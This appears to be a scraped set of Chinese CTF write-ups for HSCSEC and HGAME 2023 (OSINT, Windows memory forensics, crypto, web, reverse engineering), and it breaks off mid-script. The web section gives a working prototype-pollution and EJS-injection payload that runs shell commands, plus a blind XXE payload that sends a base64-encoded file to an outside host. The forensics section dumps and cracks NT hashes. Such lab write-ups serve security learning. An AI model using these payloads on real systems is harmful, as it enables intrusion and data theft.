​ Boat百度识图定位杭州西湖，再在地图搜具体地址。 HSCSEC&#123;浙江省杭州市西湖区龙井路1号&#125; ​ Airplane飞机图片里信息有B-30EL型号，搜索到新闻：又多了一个中型航空公司 重庆航空第30架飞机入列，里面提到 渝兴快线，再根据地面机场特征，与地图比对，为北京大兴国际机场。 HSCSEC&#123;北京市大兴区大兴国际机场&#125; ​ Tower百度识图为澳门埃菲尔铁塔，在地图搜具体地址，多次尝试才正确。 HSCSEC&#123;澳门特别行政区路氹填海区澳门路氹金光大道连贯公路澳门巴黎人&#125; ​ Cable car一眼重庆索道，根据索道和大桥的视角，在地图上找到大致范围，在利用地图3D模式，发现靠近江边的楼最高，只可能在这栋楼里，否则挡视线。楼里有标注着山什集，在美团上也能看到类似图片的分享，尝试该具体地址成功。 HSCSEC&#123;重庆市渝中区白象居4号楼9-1号&#125; ​ Romantic firework图片比较模糊，放大查看消防员衣服背后字样，猜测出甘肃消防，再搜索 甘肃 焰火，看到新闻：甘肃省白银市凌空造出两座”火焰山”，浏阳中洲烟花集团5.5万发高空礼花闪耀元宵夜，新闻中有极其相似的照片；地点为白银城区金岭公园，再在地图搜具体地址。 HSCSEC&#123;甘肃省白银市白银区金岭公园&#125; ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 4","slug":"match-HGAME-2023-Week-4","date":"2023-02-06T13:43:16.000Z","updated":"2023-02-07T12:07:47.828Z","comments":true,"path":"2023/02/06/match-HGAME-2023-Week-4/","permalink":"https://lazzzaro.github.io/2023/02/06/match-HGAME-2023-Week-4/","excerpt":"","text":"​ HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)线上赛平台：https://hgame.vidar.club请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址比赛奖金(针对校外榜)：第1名：1000Pwnhub金币第2名：800Pwnhub金币第3名：600Pwnhub金币4-10名：300Pwnhub金币补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个注意：* 所有选手均以个人为单位参赛；* 在解题过程中遇到瓶颈或困难可以私聊出题人* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。* 每周比赛结束后本周前20名需提交wp到指定邮箱本比赛最终解释权归 Vidar-Team 所有 Rank: 9 / Total Rank: 8 ​ MiscezWin (variables/auth/7zip) 非常常规的 Windows 内存取证，请使用 volatility3 注：系列题目使用同一个镜像，使用下方任意链接下载一次即可 https://pan.baidu.com/s/1FDQeEVFSSznEGpqmWgS47w?pwd=57l8 https://pan.quark.cn/s/9418099763d7 https://mega.nz/file/KzIigTKR#PqV-l7LX5X4pmBHFJQVE8g2mFS60XCbQjTmw-el92ts 使用volatility3分析Windows 10镜像。 1. variables 查看环境变量： python vol.py -f win10_22h2_19045.2486.vmem windows.envars 得到第1个flag值：hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;。 2. 7zip 查找7z文件： python3 vol.py -f win10_22h2_19045.2486.vmem windows.filescan | grep -i 7z 找到 flag.7z，导出： python3 vol.py -f win10_22h2_19045.2486.vmem windows.dumpfiles --virtaddr 0xd0064181c950 打开发现需要密码，内含文件 crack_nt_hash_for_7z_pwd.txt，文件名即提示，需要破解NTHash值得到解压密码。 提取账户信息： python3 vol.py -f win10_22h2_19045.2486.vmem windows.hashdump 得到： 1Noname 1000 aad3b435b51404eeaad3b435b51404ee 84b0d9c9f830238933e7131d60ac6436 使用cmd5查询得到 84b0d9c9f830238933e7131d60ac6436 对应明文为 asdqwe123，解压得到flag：hgame&#123;e30b6984-615c-4d26-b0c4-f455fa7202e2&#125;。 3. auth 查看命令行历史记录： python vol.py -f win10_22h2_19045.2486.vmem windows.cmdline 发现提示 flag2 is current user nthash...，根据上一题hashdump得到的结果，flag为：hgame&#123;84b0d9c9f830238933e7131d60ac6436&#125;。 ​ CryptoLLLCG “我保留了大部分LCG的特征，但是也去除了一部分，这样才知道你们需要用到LLL”，”你是有意把它去除的吗”，”是出题的过程中我去除了一部分”，”是故意的还是不小心”，”是故意的” 1234567891011121314151617181920212223from Crypto.Util.number import *from random import randintfrom sage.all import next_primefrom flag import flagclass LCG(): def __init__(self) -&gt; None: self.n = next_prime(2**360) self.a = bytes_to_long(flag) self.seed = randint(1, self.n-1) def next(self): self.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n return self.seedlcg = LCG()outputs = []for i in range(40): outputs.append(lcg.next())with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(outputs)) 出题失误，self.seed = self.seed * self.a + randint(-2**340, 2**340) % self.n 该句代码未加括号，且 $r \\in [-2^{340},2^{340}]&lt; \\text{seed} &lt;n$，直接做整除操作可以恢复 $a$。 12345678910c = [...]for i in range(1,40): m = c[i]//c[i-1] try: print(bytes.fromhex(hex(m)[2:])) except: pass b&#x27;hgame&#123;W0w_you_know_the_hidden_number_problem&#125;&#x27; ​ LLLCG Revenge 1234567891011121314151617181920212223&gt;from Crypto.Util.number import *from random import randint&gt;from sage.all import next_primefrom flag import flag class LCG(): def __init__(self) -&gt; None: self.n = next_prime(2**360) self.a = bytes_to_long(flag) self.seed = randint(1, self.n-1) def next(self): self.seed = (self.seed * self.a + randint(-2**340, 2**340)) % self.n return self.seed lcg = LCG() outputs = [] for i in range(40): outputs.append(lcg.next()) with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as f: f.write(str(outputs)) 修复后，有 $s_{i+1} \\equiv as_i+r_i \\pmod n,i \\in [0,38)$，即 $s_{i+1}=as_i+r_i+k_in,i \\in [0,38)$。 令 $A_i=s_i,B_i=-s_{i+1},x=a$，有 $-r_i = A_ix+B_i+k_in$，典型HNP问题，构建格： $M = \\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \\newline &amp; n &amp; &amp; &amp; &amp; &amp; \\newline &amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline &amp; &amp; &amp; n &amp; &amp; &amp; \\newline A_0&amp;A_1&amp;\\dots &amp; A_{38}&amp;K/n&amp; &amp; \\newline B_0&amp;B_1&amp;\\dots &amp; B_{38}&amp; &amp; K &amp; \\newline \\end{bmatrix}=\\begin{bmatrix} n &amp; &amp; &amp; &amp; &amp; &amp; \\newline &amp; n &amp; &amp; &amp; &amp; &amp; \\newline &amp; &amp;\\ddots&amp; &amp; &amp; &amp; \\newline &amp; &amp; &amp; n &amp; &amp; &amp; \\newline s_0&amp;s_1&amp;\\dots &amp; s_{38}&amp;K/n&amp; &amp; \\newline -s_1&amp;-s_2&amp;\\dots &amp; -s_{39}&amp; &amp; K &amp; \\newline \\end{bmatrix}$ 其中 $K$ 为 $r_i$ 的上界 $K=2^{340}$，则存在一个 $M$ 的整系数线性组合 $v$，用LLL算法可以得到 $v_k$。 1234567891011121314151617181920212223242526n = 2348542582773833227889480596789337027375682548908319870707290971532209025114608443463698998384768703031935081c = [...]t = 39A = []B = []for i in range(39): A.append(c[i]) B.append(-c[i+1])K = 2^340 X = n * identity_matrix(QQ, t)Z = matrix(QQ, [0] * t + [K/n] + [0]).transpose()Z2 = matrix(QQ, [0] * (t+1) + [K]).transpose()Y = block_matrix([[X],[matrix(QQ, A)], [matrix(QQ, B)]])Y = block_matrix([[Y, Z, Z2]])Y = Y.LLL()k0 = ZZ(Y[1, 0] % n)flag = ZZ(Y[1, -2] / (K/n) % n)assert(k0 == (A[0]*flag + B[0]) % n)print(bytes.fromhex(hex(flag)[2:]))# b&#x27;hgame&#123;Repair_modulus_prob1em_5o_HNP_Revenge&#125;&#x27; ​ ECRSA 兔兔拜年时遇到了RSA，听说RSA还没有另一半于是把EC介绍给了他。 12345678910111213141516171819202122232425262728from sage.all import *from sage.all_cmdline import *from Crypto.Util.number import *from secret import flagNbits = 512x = bytes_to_long(flag)f = open(&#x27;./output&#x27;, &#x27;w&#x27;)def gen_pubkey(Nbits): p = getPrime(Nbits // 2) q = getPrime(Nbits // 2) n = p*q while True: a = getRandomInteger(Nbits // 2) b = getRandomInteger(Nbits // 2) if gcd(4*a**3 + 27*b**2, n) == 1: break E = EllipticCurve(Zmod(n), [a, b]) e = getPrime(64) f.write(f&quot;p=&#123;p&#125;\\nq=&#123;q&#125;\\n&quot;) return n, E, en, E, e = gen_pubkey(Nbits)pt = E.lift_x(Integer(x))ct = pt * ef.write(f&quot;n = &#123;n&#125;\\na = &#123;E.a4()&#125;\\nb = &#123;E.a6()&#125;\\ne = &#123;e&#125;\\n&quot;)f.write(f&quot;ciphertext = &#123;long_to_bytes(int(ct.xy()[0]))&#125;\\n&quot;) 给出点 $C=eP$ 的横坐标，根据椭圆曲线性质，点 $C$ 也在曲线上。 再利用 $e$ 对 $\\#E(\\mathbb{F}_p) \\times \\#E(\\mathbb{F}_q)$ 取模逆即可得到 $E(\\mathbb{Z}/n\\mathbb{Z})$ 意义下的 $d$，再解密按照RSA方式解密。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import gmpy2p = 115192265954802311941399019598810724669437369433680905425676691661793518967453q = 109900879774346908739236130854229171067533592200824652124389936543716603840487n = 12659731371633323406361071735480743870942884407511647144758055911931321534333057725377899993936046070028289182446615763391740446071787318153462098556669611a = 34573016245861396068378040882622992245754693028152290874131112955018884485688b = 103282137133820948206682036569671566996381438254897510344289164039717355513886e = 11415307674045871669ciphertext = b&#x27;f\\xb1\\xae\\x08`\\xe8\\xeb\\x14\\x8a\\x87\\xd6\\x18\\x82\\xaf1q\\xe4\\x84\\xf0\\x87\\xde\\xedF\\x99\\xe0\\xf7\\xdcH\\x9ai\\x04[\\x8b\\xbbHR\\xd6\\xa0\\xa2B\\x0e\\xd4\\xdbr\\xcc\\xad\\x1e\\xa6\\xba\\xad\\xe9L\\xde\\x94\\xa4\\xffKP\\xcc\\x00\\x907\\xf3\\xea&#x27;E = EllipticCurve(Zmod(n), [a, b])cx = int(ciphertext.hex(),16)Ep = E.change_ring(GF(p))Eq = E.change_ring(GF(q))d = inverse_mod(e, Ep.order() * Eq.order())print(d)cy2 = (cx^3 + a * cx + b) % nc = cy2e = 2P.&lt;a&gt; = PolynomialRing(Zmod(p),implementation=&#x27;NTL&#x27;)f = a^e-cmps = f.monic().roots()P.&lt;a&gt; = PolynomialRing(Zmod(q),implementation=&#x27;NTL&#x27;)g = a^e-cmqs = g.monic().roots()cy_all = []for mpp in mps: x = mpp[0] for mqq in mqs: y = mqq[0] cy_all.append(CRT_list([int(x), int(y)], [p, q])) for cy in cy_all: C = E(cx,cy) m, _ = (int(d)*C).xy() try: print(bytes.fromhex(hex(m)[2:])) except: pass # b&#x27;hgame&#123;ECC_4nd_RSA_also_can_be_combined&#125;&#x27; ​ WebShared Diary ek1ng给协会成员写了一个在线共享日记本，不论是谁只要知道密码，都可以在上面记录自己的小秘密。不过好像他的js学的并不好导致无意中引入了漏洞，看来js也有很多安全问题。 node.js Express框架，app.js ： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879const express = require(&#x27;express&#x27;);const bodyParser = require(&#x27;body-parser&#x27;);const session = require(&#x27;express-session&#x27;);const randomize = require(&#x27;randomatic&#x27;);const ejs = require(&#x27;ejs&#x27;);const path = require(&#x27;path&#x27;);const app = express();function merge(target, source) &#123; for (let key in source) &#123; // Prevent prototype pollution if (key === &#x27;__proto__&#x27;) &#123; throw new Error(&quot;Detected Prototype Pollution&quot;) &#125; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125;app .use(bodyParser.urlencoded(&#123;extended: true&#125;)) .use(bodyParser.json());app.set(&#x27;views&#x27;, path.join(__dirname, &quot;./views&quot;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.all(&quot;/login&quot;, (req, res) =&gt; &#123; if (req.method == &#x27;POST&#x27;) &#123; // save userinfo to session let data = &#123;&#125;; try &#123; merge(data, req.body) console.log(data); &#125; catch (e) &#123; return res.render(&quot;login&quot;, &#123;message: &quot;Don&#x27;t pollution my shared diary!&quot;&#125;) &#125; req.session.data = data console.log(req.session); // check password let user = &#123;&#125;; console.log(user); user.password = req.body.password; console.log(user); if (user.password=== &quot;testpassword&quot;) &#123; user.role = &#x27;admin&#x27; &#125; if (user.role === &#x27;admin&#x27;) &#123; req.session.role = &#x27;admin&#x27; return res.redirect(&#x27;/&#x27;) &#125;else &#123; return res.render(&quot;login&quot;, &#123;message: &quot;Login as admin or don&#x27;t touch my shared diary!&quot;&#125;) &#125; &#125; res.render(&#x27;login&#x27;, &#123;message: &quot;&quot;&#125;);&#125;);app.all(&#x27;/&#x27;, (req, res) =&gt; &#123; if (!req.session.data || !req.session.data.username || req.session.role !== &#x27;admin&#x27;) &#123; return res.redirect(&quot;/login&quot;) &#125; if (req.method == &#x27;POST&#x27;) &#123; let diary = ejs.render(`&lt;div&gt;$&#123;req.body.diary&#125;&lt;/div&gt;`) req.session.diary = diary return res.render(&#x27;diary&#x27;, &#123;diary: req.session.diary, username: req.session.data.username&#125;); &#125; return res.render(&#x27;diary&#x27;, &#123;diary: req.session.diary, username: req.session.data.username&#125;);&#125;)app.listen(8888, &#x27;0.0.0.0&#x27;); 审计源码，merge() 函数存在原型链污染漏洞，但禁用了 __proto__，利用 constructor.prototype 绕过。 将 user.role 设置为admin，绕过权限控制后，进入 / 路由，而 ejs.render() 存在SSTI漏洞，设置 diary 值为 &lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;ls -al /&#39;) %&gt; 即可RCE。 手动修改 Content-Type 为 application/json，POST payload： 12&#123;&quot;username&quot;:&quot;xxx&quot;,&quot;password&quot;:&quot;ttt&quot;,&quot;diary&quot;:&quot;&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;) %&gt;&quot;,&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;role&quot;:&quot;admin&quot;&#125;&#125;&#125; 得到flag：hgame&#123;N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection&#125;。 ​ Tell Me Just tell me your thoughts 查看源代码提示 hint: ./www.zip，查看 send.php： 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php libxml_disable_entity_loader(false);if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;)&#123; $xmldata = file_get_contents(&quot;php://input&quot;); if (isset($xmldata))&#123; $dom = new DOMDocument(); try &#123; $dom-&gt;loadXML($xmldata, LIBXML_NOENT | LIBXML_DTDLOAD); &#125;catch(Exception $e)&#123; $result = &quot;loading xml data error&quot;; echo $result; return; &#125; $data = simplexml_import_dom($dom); if (!isset($data-&gt;name) || !isset($data-&gt;email) || !isset($data-&gt;content))&#123; $result = &quot;name,email,content cannot be empty&quot;; echo $result; return; &#125; if ($data-&gt;name &amp;&amp; $data-&gt;email &amp;&amp; $data-&gt;content)&#123; $result = &quot;Success! I will see it later&quot;; echo $result; return; &#125;else &#123; $result = &quot;Parse xml data error&quot;; echo $result; return; &#125; &#125;&#125;else &#123; die(&quot;Request Method Not Allowed&quot;);&#125;?&gt; 使用 loadXML()+simplexml_import_dom() 函数解析xml数据，存在XXE漏洞，但无可控制的回显信息，使用外带方式带出命令执行结果。 在VPS新建 test.dtd，内容： 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;https://eo3dgkbstljeu1v.m.pipedream.net?p=%file;&#x27;&gt;&quot;&gt; POST数据： 12345&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://VPS-IP/test.dtd&quot;&gt;%remote;%int;%send;]&gt;&lt;user&gt;&lt;name&gt;s&lt;/name&gt;&lt;email&gt;d&lt;/email&gt;&lt;content&gt;sss&lt;/content&gt;&lt;/user&gt; 在pipedream得到回显： https://eo3dgkbstljeu1v.m.pipedream.net?p=PD9waHAgDQogICAgJGZsYWcxID0gImhnYW1le0JlX0F3YXJlXzBmX1hYZUJsMW5kMW5qZWN0aTBufSI7DQo/Pg== base64解码得 flag.php 内容： 123&lt;?php $flag1 = &quot;hgame&#123;Be_Aware_0f_XXeBl1nd1njecti0n&#125;&quot;;?&gt; ​ Reverseshellcode 兔兔的电脑不小心中了病毒，病毒把他写的论文给加密了，你能帮兔兔恢复吗？ Go程序，在 main_main() 中查看代码逻辑，结合题目，其中一个长base64编码字符串可能为调用的shellcode字符串。 提取出来： VUiD7FBIjWwkIEiJTUBIi0VAiwCJRQC4BAAAAEgDRUCLAIlFBMdFCAAAAADHRQwj782rx0UQFgAAAMdFFCEAAADHRRgsAAAAx0UcNwAAAMdFIAAAAACLRSCD+CBzWotFDANFCIlFCItFBMHgBANFEItVCANVBDPCi1UEweoFA1UUM8IDRQCJRQCLRQDB4AQDRRiLVQgDVQAzwotVAMHqBQNVHDPCA0UEiUUEuAEAAAADRSCJRSDrnkiLRUCLVQCJELgEAAAASANFQItVBIkQSI1lMF3D 解码后保存为文件，使用IDA查看，识别为函数： 12345678910111213141516171819202122_DWORD *__fastcall sub_1(unsigned int *a1)&#123; _DWORD *result; // rax unsigned int v2; // [rsp+20h] [rbp+0h] unsigned int v3; // [rsp+24h] [rbp+4h] int v4; // [rsp+28h] [rbp+8h] unsigned int i; // [rsp+40h] [rbp+20h] v2 = *a1; v3 = a1[1]; v4 = 0; for ( i = 0; i &lt; 0x20; ++i ) &#123; v4 += 0xABCDEF23; v2 += ((v3 &gt;&gt; 5) + 33) ^ (v3 + v4) ^ (16 * v3 + 22); v3 += ((v2 &gt;&gt; 5) + 55) ^ (v2 + v4) ^ (16 * v2 + 44); &#125; *a1 = v2; result = a1 + 1; a1[1] = v3; return result;&#125; 易知代码为魔改了Delta值的TEA加密算法，解密： 12345678910111213141516171819202122232425262728293031323334from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] x = 0xABCDEF23 * 32 delta = 0xABCDEF23 k0 = k[0] k1 = k[1] k2 = k[2] k3 = k[3] for i in range(32): v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; 5) + k3) v1 = v1 &amp; 0xFFFFFFFF v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; 5) + k1) v0 = v0 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vf = open(&#x27;flag.enc&#x27;,&#x27;rb&#x27;).read()c = [bytes_to_long(f[4*i:4*(i+1)][::-1]) for i in range(len(f)//4)]print(c)key = [22, 33, 44, 55]flag = b&#x27;&#x27;for i in range(len(c)//2): d = decrypt(c[2*i:2*(i+1)], key) flag += long_to_bytes(d[0])[::-1] + long_to_bytes(d[1])[::-1]print(flag) # b&quot;hgame&#123;th1s_1s_th3_tutu&#x27;s_h0mew0rk&#125;\\x00&quot;","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HGAME 2023 Week 3","slug":"match-HGAME-2023-Week-3","date":"2023-01-30T09:25:16.000Z","updated":"2023-01-30T06:01:55.753Z","comments":true,"path":"2023/01/30/match-HGAME-2023-Week-3/","permalink":"https://lazzzaro.github.io/2023/01/30/match-HGAME-2023-Week-3/","excerpt":"","text":"​ HGAME 2023 将于 1 月 5 日 20:00 正式开始，祝大家玩得开心 :-)线上赛平台：https://hgame.vidar.club请尽快注册，注册时请选择校外选手，注册将于 1 月 12 日 20:00 关闭本次比赛的奖励事宜以及赛后沟通反馈以邮件为主，请各位使用真实的邮件地址比赛奖金(针对校外榜)：第1名：1000Pwnhub金币第2名：800Pwnhub金币第3名：600Pwnhub金币4-10名：300Pwnhub金币补充说明：排行榜分数相同者，以先达到该分数的时间次序划定排名，每位获奖选手额外赠送 Pwnhub 邀请码一个注意：* 所有选手均以个人为单位参赛；* 在解题过程中遇到瓶颈或困难可以私聊出题人* 禁止所有破坏比赛公平公正的行为，如：散播或与其他人交换 Flag、解题思路，对平台、参赛者或其他人员进行攻击。违者分数作废并取消比赛资格。* HGAME 线上赛分为四周，每周至官方wp发布前前禁止一切讨论本周题目以及公开自己 wp 的行为。在收集完成后会开放讨论，但仅能讨论已结束的题目。* 每周比赛结束后本周前20名需提交wp到指定邮箱本比赛最终解释权归 Vidar-Team 所有 Rank: 7 ​ MiscTunnel Just a very very very safe tunnel. HINTS: 由于附件有问题分数下调至50分 16进制查看器，搜索 hgame ，有 hgame&#123;ikev1_may_not_safe_aw987rtgh&#125;。 ​ CryptoezDH 这大过年的，Bob给Alice发了什么消息呢 12345678910111213141516171819202122232425262728293031from sage.all import *from Crypto.Util.number import *from secret import Alice_secret, Bob_secret, FLAGimport randomf = open(&#x27;output&#x27;, &#x27;w&#x27;)N=0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001g = 2A = power_mod(g, Alice_secret, N)f.write(&quot;Alice send to Bob: &#123;&#123; &#x27;g&#x27;: &#123;g&#125;, &#x27;A&#x27;: &#123;A&#125; &#125;&#125;\\n&quot;.format(g=g, A=hex(A)))B = power_mod(g, Bob_secret, N)f.write(&quot;Bob send to Alice: &#123;&#123;&#x27;B&#x27;: &#123;B&#125; &#125;&#125;\\n&quot;.format(B=hex(B)))shared_secret = pow(A, Bob_secret, N)p=6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151a=-3b=1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984E = EllipticCurve(GF(p), [a, b])G = E.random_point()Pa = shared_secret * Gf.write(f&quot;Alice send to Bob: &#123;&#123; &#x27;E&#x27;: &#123;E&#125;, &#x27;G&#x27;: &#123;G.xy()&#125;, &#x27;Pa&#x27;: &#123;Pa.xy()&#125; &#125;&#125;\\n&quot;)k = random.randint(2, p)m = E.lift_x(Integer(bytes_to_long(FLAG)))P1 = k * GP2 = k * Pac = m + P2f.write(f&quot;Bob send to Alice: &#123;&#123; &#123;P1.xy()&#125;, &#123;c.xy()&#125; &#125;&#125;\\n&quot;) $N$ 为质数，$N-1$ 足够光滑，DLP易求，再利用 $c=m+P_2=m+kP_a=m+ksG=m+sP_1$，代入 $c,s,P_1$ 求得 $m$。 123456789101112131415161718192021N = 0x2be227c3c0e997310bc6dad4ccfeec793dca4359aef966217a88a27da31ffbcd6bb271780d8ba89e3cf202904efde03c59fef3e362b12e5af5afe8431cde31888211d72cc1a00f7c92cb6adb17ca909c3b84fcad66ac3be724fbcbe13d83bbd3ad50c41a79fcdf04c251be61c0749ea497e65e408dac4bbcb3148db4ad9ca0aa4ee032f2a4d6e6482093aa7133e5b1800001g = 2A = 0x22888b5ac1e2f490c55d0891f39aab63f74ea689aa3da3e8fd32c1cd774f7ca79538833e9348aebfc8eba16e850bbb94c35641c2e7e7e8cb76032ad068a83742dbc0a1ad3f3bef19f8ae6553f39d8771d43e5f2fcb986bd72459456d073e70d5be4d79ce5f10f76edea01492f11b807ebff0faf6819d62a8e972084e1ed5dd6e0152df2b0477a42246bbaa04389abf639833B = 0x1889c9c65147470fdb3ad3cf305dc3461d1553ee2ce645586cf018624fc7d8e566e04d416e684c0c379d5819734fd4a09d80add1b3310d76f42fcb1e2f5aac6bcdd285589b3c2620342deffb73464209130adbd3a444b253fc648b40f0acec7493adcb3be3ee3d71a00a2b121c65b06769aada82cd1432a6270e84f7350cd61dddc17fe14de54ab436f41b9c9a0430510ddeb = discrete_log(mod(B,N),mod(g,N))s = pow(A,b,N)p = 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151a = -3b = 1093849038073734274511112390766805569936207598951683748994586394495953116150735016013708737573759623248592132296706313309438452531591012912142327488478985984E = EllipticCurve(GF(p), [a, b])G = E(6205877918333770287323403670543661734129170085954198767820861962261174202646976379181735257759867760655835711845144326470613882395445975482219869828210975915, 3475351956909044812130266914587199895248867449669290021764126870271692995160201860564302206748373950979891071705183465400186006709376501382325624851012261206)Pa = E(2131916734759224323822132103713450942372127857975491448998753734796387810139407713081623540463771547844600806401723562334185214530516095152824413924854874698, 1690322613136671350646569297044951327454506934124656653046321341087958059722809120500999091493097880695888777563486212179798037350151439310538948719271467773)P1 = E(2032638959575737798553734238953177065671021112450002471824225734491735604600003028491729131445734432442510201955977472408728415227018746467250107080483073647, 3510147080793750133751646930018687527128938175786714269902604502700248948154299853980250781583789623838631244520649113071664767897964611902120411142027848868)c = E(6670373437344180404127983821482178149374116817544688094986412631575854021385459676854475335068369698875988135009698187255523501841013430892133371577987480522, 6648964426034677304189862902917458328845484047818707598329079806732346274848955747700716101983207165347315916182076928764076602008846695049181874187707051395)m = c - s*P1print(bytes.fromhex(hex(m[0])[2:]))# b&#x27;hgame&#123;Weak_p@ramet3r_make_DHKE_broken&#125;&#x27; ​ RSA 大冒险2 好耶，又是大冒险！ HINTS: Challenge 3: p泄漏的位数不够多，导致coppersmith方法解不出来，那么有没有什么办法能够扩大coppersmith的界呢？注意coppersmith方法使用了LLL算法，那么这个界和格基又有什么关系呢？ 123456789101112131415161718192021222324252627282930313233343536373839# challenge1.pyfrom Crypto.Util.number import *from math import isqrtfrom challenges import chall1_secretclass RSAServe: def __init__(self) -&gt; None: def create_keypair(size): while True: p = getPrime(size // 2) q = getPrime(size // 2) if q &lt; p &lt; 2*q: break N = p*q phi = (p-1)*(q-1) max_d = isqrt(isqrt(N)) // 3 max_d_bits = max_d.bit_length() - 1 while True: d = getRandomNBitInteger(max_d_bits) try: e = int(inverse(d, phi)) except ZeroDivisionError: continue if (e * d) % phi == 1: break return N, e, d self.N, self.e, self.d = create_keypair(1024) self.m = chall1_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_ ,self.e, self.N) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return &#123;&quot;N&quot;:self.N, &quot;e&quot;:self.e&#125; 12345678910111213141516171819202122232425262728293031323334353637# challenge2.pyfrom Crypto.Util.number import *from challenges import chall2_secretdef next_prime(p): k=1 while True: if isPrime(p+k): return p+k k+=1class RSAServe: def __init__(self) -&gt; None: def creat_keypair(nbits, beta): p = getPrime(nbits // 2) q = next_prime(p+getRandomNBitInteger(int(nbits*beta))) N = p*q phi = (p-1)*(q-1) while True: e = getRandomNBitInteger(16) if GCD(e, phi) == 2: break d = inverse(e, phi) return N, e, d self.N, self.e, self.d = creat_keypair(1024, 0.25) self.m = chall2_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.N) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return &#123;&quot;N&quot;:self.N, &quot;e&quot;:self.e&#125; 12345678910111213141516171819202122232425262728# challenge3.pyfrom Crypto.Util.number import *from challenges import chall3_secretclass RSAServe: def __init__(self) -&gt; None: def create_keypair(nbits): p = getPrime(nbits // 2) q = getPrime(nbits // 2) N = p*q phi = (p-1)*(q-1) e = 65537 d = inverse(e, phi) leak = p &gt;&gt; 253 return N, e, d, leak self.N, self.e, self.d, self.leak = create_keypair(1024) self.m = chall3_secret def encrypt(self): m_ = bytes_to_long(self.m) c = pow(m_, self.e, self.N) return hex(c) def check(self, msg): return msg == self.m def pubkey(self): return &#123;&quot;N&quot;:self.N, &quot;e&quot;:self.e, &quot;leak&quot;:self.leak&#125; 求解三层RSA拿flag。 第一层，$q&lt;p&lt;2q,d&lt;\\cfrac{1}{3}N^{\\frac{1}{4}}$，满足Wiener Attack条件。 123456789101112131415161718192021222324252627282930313233def factor_rsa_wiener(N, e): N = Integer(N) e = Integer(e) cf = (e / N).continued_fraction().convergents() for f in cf: k = f.numer() d = f.denom() if k == 0: continue phi_N = ((e * d) - 1) / k b = -(N - phi_N + 1) dis = b ^ 2 - 4 * N if dis.sign() == 1: dis_sqrt = sqrt(dis) p = (-b + dis_sqrt) / 2 q = (-b - dis_sqrt) / 2 if p.is_integer() and q.is_integer() and (p * q) % N == 0: p = p % N q = q % N if p &gt; q: return (p, q) else: return (q, p)N = 137549711547277501490512652253223705009896739033213206450427185227633740625388392382604507796908923883409603222056205390907355567345203551544782114279172864959402320300753748333020687530365352630647687557310169459736318329569719516536939612675375837585785285970788429934265825996569888095986259096503876786157e = 93353589564181636718027173778502268418513041301835540045681119331234573983360292187550959060357949657609295815897069024673722589144338487101058734688906424145037973559780521703111302989561973563657725186914522917495401111500951519775376691911667795239110869653121682582184013495282531768528802139272651917441c = 